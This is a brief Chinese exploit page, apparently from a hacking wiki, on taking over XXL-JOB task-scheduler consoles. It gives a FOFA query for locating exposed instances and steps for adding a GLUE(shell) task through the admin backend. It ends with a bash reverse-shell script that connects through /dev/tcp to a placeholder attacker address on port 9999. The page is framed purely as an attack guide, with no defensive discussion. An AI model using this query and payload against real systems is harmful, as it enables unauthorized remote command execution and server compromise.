FOFA
----

    app="XXL-JOB" || title="任务调度中心"

漏洞利用
--------

登錄後台增加一個任務:

![](Xxl-4.png "Xxl-4.png")

注意運行模式需要為 GLUE(shell)

![](Xxl-5.png "Xxl-5.png")

點擊 GLUE IDE編輯腳本

![](Xxl-6.png "Xxl-6.png")

![](Xxl-7.png "Xxl-7.png")

執行探測出網，和任務調用是否可執行

反彈一個shell

    #!/bin/bash
    bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'

參考
----

<https://short.pwnwiki.org/?c=PaRcxf>